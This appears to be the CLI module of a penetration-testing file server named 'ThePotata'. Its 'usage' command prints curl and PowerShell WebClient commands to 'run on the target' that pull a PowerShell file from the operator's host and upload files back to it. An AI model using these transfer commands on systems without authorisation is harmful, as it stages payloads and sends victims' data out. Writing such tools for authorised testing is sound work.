import os
from argparse import Namespace
from typing import List

from utils import italic, bold, get_ipv4_address, ThePotataCommonException


class CliOption:
    def __init__(self, context: Namespace, name: str, description: str):
        self.context = context
        self.name = name
        self.description = description

    @staticmethod
    def simplify_path(path):
        return path.replace(os.path.expanduser("~"), "~")

    def __str__(self):
        return f'  {bold(self.name)} {self.description}'

    def __call__(self, *args, **kwargs):
        raise NotImplemented


class CliPathAddOption(CliOption):
    def __init__(self, context: Namespace):
        super().__init__(context, 'path', '[add <path>/del <path>/show] Add path')

    def __call__(self, opt: str = None, path: str = None):
        if opt in ['add', 'del'] and not path:
            print(self)
            return

        if opt == 'add':
            return self.__add_path(path)
        elif opt == 'show':
            return self.__show()
        elif opt == 'del':
            return self.__del_path(path)
        else:
            print(self)

    def __del_path(self, path):
        if len(self.context.server.path_map) == 1:
            print('You need at least one path to serve')
            return

        self.context.server.path_map.pop(path)

    def __show(self):
        print(bold('\nServing paths:\n'))
        for uuid in self.context.server.path_map:
            print(f'• {uuid}  {self.simplify_path(self.context.server.path_map[uuid])}/')
        print()

    def __add_path(self, path: str):
        real_path = os.path.expanduser(path)
        if not os.path.isdir(real_path):
            print(f'Path "{real_path}" does not exists')
            return
        _id = str(len(self.context.server.path_map) + 1)
        self.context.server.path_map[_id] = real_path
        print(f'New path added: {_id}: {real_path}\n')


class CliLsOption(CliOption):
    def __init__(self, context):
        super().__init__(context, 'ls', 'List files in serving directories')

    def __call__(self):
        for dir_key, dir_val in self.context.server.path_map.items():
            print(f'\n{dir_key} ({dir_val}):\n')
            for f in os.listdir(dir_val):
                if os.path.isdir(os.path.join(dir_val, f)):
                    print(f'• {f}/')
                else:
                    print(f'• {f}')
            print('')


class CliIpOption(CliOption):
    def __init__(self, context):
        super().__init__(context, 'ip', 'Shows IPs')

    def __call__(self, iface=''):
        addresses = get_ipv4_address(iface)
        print(bold('\nIP Addresses:'))
        for iface, addr in addresses.items():
            if iface == 'lo':
                continue
            print(f'  {bold(iface)} {addr}')
        print('')


class CliHelpOption(CliOption):
    def __init__(self, context):
        super().__init__(context, 'help', 'Show available commands')

    def __call__(self, command=None):
        print(bold("\nCLI Commands:"))
        if command and command in self.context.commands:
            print(self.context.commands[command])
        else:
            for cmd in self.context.commands:
                print(self.context.commands[cmd])
        print('')


class CliOptionsOption(CliOption):
    def __init__(self, context):
        super().__init__(context, 'options', 'Print options')

    def __call__(self):
        print(f'\n{bold("Server options:")}\n'
              f'{bold("→ Server is started on")} {self.context.ip}:{self.context.port}\n'
              f'{bold("→ Serve at")} {os.path.abspath(self.context.serve_dir)}\n'
              f'{bold("→ Save uploads to")} {os.path.abspath(self.context.save_dir)}\n')


class CliUsageOption(CliOption):
    def __init__(self, context):
        super().__init__(context, 'usage', 'Print usage')

    def print_curl(self):
        curr_folder = list(self.context.server.path_map.keys())[0]
        url = f'http://{self.context.ip}:{self.context.port}/{curr_folder}'

        curl_usage = f'{italic("cURL command GET:")}\n' \
                     f'    $ curl {url}/\n\n' \
                     f'{italic("cURL command GET (file download):")}\n' \
                     f'    $ curl {url}/File.psq -o File.ps1\n\n' \
                     f'{italic("cURL command to upload a file:")}\n' \
                     f'    $ curl {url} -F "file=@/home/l1sp3r/image.png"\n'
        print(curl_usage)

    def print_ps(self):
        curr_folder = list(self.context.server.path_map.keys())[0]
        url = f'http://{self.context.ip}:{self.context.port}/{curr_folder}/'

        ps_usage = f'{italic("PowerShell command to upload a file:")}\n' \
                   f'    PS > $wc = New-Object System.Net.WebClient\n' \
                   f'    PS > $wc.UploadFile("{url}", "/home/l1sp3r/image.png")\n'
        print(ps_usage)

    def __call__(self, arg='all'):
        print(f'\n{bold("Run on the target:")}\n')

        if arg == 'curl':
            self.print_curl()

        elif arg == 'ps':
            self.print_ps()

        else:
            self.print_curl()
            self.print_ps()


class CLiExitOption(CliOption):
    def __init__(self, context):
        super().__init__(context, name='exit', description='Stop server and exit')

    def __call__(self, *args, **kwargs):
        raise ThePotataCommonException()


class CLI:
    def __init__(self, context: Namespace = Namespace()):
        self.context = context
        self.context.commands = {
            'ls': CliLsOption(self.context),
            'ip': CliIpOption(self.context),
            'help': CliHelpOption(self.context),
            'usage': CliUsageOption(self.context),
            'options': CliOptionsOption(self.context),
            'exit': CLiExitOption(self.context),
            'path': CliPathAddOption(self.context)
        }

    def run_command(self, cmd: str, *args: List[str], **kwargs) -> None:
        try:
            self.context.commands[cmd](*args, **kwargs)
        except (KeyError, TypeError):
            pass
